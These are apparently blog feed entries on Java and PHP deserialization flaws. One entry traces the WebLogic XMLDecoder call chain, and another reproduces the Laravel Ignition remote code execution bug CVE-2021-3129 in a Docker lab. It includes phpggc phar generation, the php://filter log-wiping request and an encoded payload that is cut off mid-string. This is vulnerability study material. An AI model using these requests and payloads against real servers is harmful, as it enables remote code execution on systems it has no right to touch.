alt="4oOADs.png"></p><p>2.</p><p><code>/server/lib/weblogic.jar/weblogic/wsee/jaxws/workcontext/WorkContextTube.class#readHeaderOld</code></p><p>包含payload的参数var4被传入WorkContextXmlInputAdapter的构造函数，然后作为参数传入新的XMLDecoder示例实例。然后<code>WorkContextXmlInputAdapter</code>实例也就是var6被传入receive</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOEbn.png" alt="4oOEbn.png"></p><p>3.</p><p><code>/server/lib/weblogic.jar/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#receive</code></p><p>继续进入receiveRequest</p><p><img src="https://z3.ax1x.com/2021/09/30/4oO9C8.png" alt="4oO9C8.png"></p><p>4.</p><p><code>server/lib/wlclient.jar/weblogic/workarea/WorkContextLocalMap#receiveRequest</code></p><p>进入readEntry</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOPgg.png" alt="4oOPgg.png"></p><p>5.</p><p><code>server/lib/wlclient.jar/weblogic/workarea/spi/WorkContextEntryImpl#readEntry</code></p><p>调用readUTF</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOkuj.png" alt="4oOkuj.png"></p><p>6.</p><p><code>/server/lib/weblogic.jar/weblogic/wsee/workarea/WorkContextXmlInputAdapter#readUTF</code></p><p>触发readObject</p><p><img src="https://z3.ax1x.com/2021/09/30/4oOivQ.png" alt="4oOivQ.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hu3sky.github.io/2019/10/16/weblogic/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://hu3sky.github.io/2019/10/16/weblogic/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><p><a href="https://xz.aliyun.com/t/8465#toc-8">https://xz.aliyun.com/t/8465#toc-8</a></p><p><a href="https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-3129分析</title>
    <link href="/2021/09/25/CVE-2021-3129%E5%88%86%E6%9E%90/"/>
    <url>/2021/09/25/CVE-2021-3129%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接用github上的环境</p><p><a href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p><p>启动docker</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span> <br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4sMfnH"><img src="https://z3.ax1x.com/2021/09/25/4sMfnH.png" alt="4sMfnH.png"></a></p><p>提示缺少 app key，点击Generate app key生成一个app key，然后刷新一下即可</p><p><a href="https://imgtu.com/i/4sMRje"><img src="https://z3.ax1x.com/2021/09/25/4sMRje.png" alt="4sMRje.png"></a></p><p>访问成功</p><p><a href="https://imgtu.com/i/4sM2cD"><img src="https://z3.ax1x.com/2021/09/25/4sM2cD.png" alt="4sM2cD.png"></a></p><p>把源码拷出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> cp <span class="hljs-number">10248</span>b<span class="hljs-number">3157</span>ad:/src ./src<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4sMc9K"><img src="https://z3.ax1x.com/2021/09/25/4sMc9K.png" alt="4sMc9K.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o phar.gif<br></code></pre></td></tr></table></figure><p>把phar文件拷贝到docker容器里面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp phar.gif <span class="hljs-number">10248</span>b3157ad:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>phar.gif<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4sMIAI"><img src="https://z3.ax1x.com/2021/09/25/4sMIAI.png" alt="4sMIAI.png"></a></p><p>触发phar反序列化</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: 192.168.248.128:8888<br><span class="hljs-attribute">Content-Type</span>: application/json<br><span class="hljs-attribute">Content-Length</span>: 199<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///var/www/html/phar.gif/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgtu.com/i/4sMoNt"><img src="https://z3.ax1x.com/2021/09/25/4sMoNt.png" alt="4sMoNt.png"></a></p><h2 id="利用laravel-log日志文件触发phar反序列化"><a href="#利用laravel-log日志文件触发phar反序列化" class="headerlink" title="利用laravel.log日志文件触发phar反序列化"></a>利用laravel.log日志文件触发phar反序列化</h2><p>执行六个步骤</p><p>1.</p><p>清空原日志文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-attr">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.</p><p>用phpggc生成phar序列化利用POC（编码后的），在最后加一个a</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w <span class="hljs-number">0</span> | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4sMH9f"><img src="https://z3.ax1x.com/2021/09/25/4sMH9f.png" alt="4sMH9f.png"></a></p><p>3.</p><p>给Log增加一次前缀，用于对齐</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>  <span class="hljs-attr">&quot;parameters&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,<br>    <span class="hljs-attr">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;AA&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>4.</p><p>发送payload</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;=<span class="hljs-number">50=00=44=00</span>=<span class="hljs-number">39=00=77=00</span>=<span class="hljs-number">61=00=48=00</span>=<span class="hljs-number">41=00=67=00</span>=<span class="hljs-number">58=00=31=00</span>=<span class="hljs-number">39=00=49=00</span>=<span class="hljs-number">51=00=55=00</span>=<span class="hljs-number">78=00=55=00</span>=<span class="hljs-number">58=00=30=00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=50=00=54</span>=<span class="hljs-number">00=56=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=54=00=45</span>=<span class="hljs-number">00=56=00=53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=37=00=49</span>=<span class="hljs-number">00=44=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00=44=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=66=00=41</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=42=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=44</span>=<span class="hljs-number">00=49=00=41</span>=<span class="hljs-number">00=51=00=41</span>=<span class="hljs-number">00=41=00=54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=53</span>=<span class="hljs-number">00=57=00=78</span>=<span class="hljs-number">00=73=00=64</span>=<span class="hljs-number">00=57=00=31</span>=<span class="hljs-number">00=70=00=62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=46=00=30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=56=00=78</span>=<span class="hljs-number">00=43=00=63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=39=00=68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=68=00=63</span>=<span class="hljs-number">00=33=00=52</span>=<span class="hljs-number">00=70=00=62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=64=00=63</span>=<span class="hljs-number">00=55=00=47</span>=<span class="hljs-number">00=56=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=43</span>=<span class="hljs-number">00=49=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=67=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=56=00=75</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=48=00=56</span>=<span class="hljs-number">00=74=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=63=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=45</span>=<span class="hljs-number">00=52=00=70</span>=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=42=00=68</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=36</span>=<span class="hljs-number">00=65=00=33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00=54=00=59</span>=<span class="hljs-number">00=36=00=49</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=71=00=41</span>=<span class="hljs-number">00=48=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00=78=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=32=00=45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00=61=00=54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=76</span>=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=54</span>=<span class="hljs-number">00=47=00=39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=79=00=58</span>=<span class="hljs-number">00=45=00=56</span>=<span class="hljs-number">00=32=00=59</span>=<span class="hljs-number">00=57=00=78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=41=00=36</span>=<span class="hljs-number">00=65=00=33</span>=<span class="hljs-number">00=31=00=70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=74=00=39</span>=<span class="hljs-number">00=66=00=58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00=51=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=67=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=48=00=56</span>=<span class="hljs-number">00=74=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=63=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=76=00=59</span>=<span class="hljs-number">00=57=00=52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=59=00=58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=30=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00=58=00=45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=45</span>=<span class="hljs-number">00=56=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=30=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00=35=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=30=00=61</span>=<span class="hljs-number">00=57=00=39</span>=<span class="hljs-number">00=75=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=74=00=50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">72</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=35=00=58</span>=<span class="hljs-number">00=45=00=64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=56=00=79</span>=<span class="hljs-number">00=59=00=58</span>=<span class="hljs-number">00=52=00=76</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=72=00=52</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=35=00=70</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=76=00=62</span>=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=67=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=61=00=57</span>=<span class="hljs-number">00=63=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=76</span>=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span 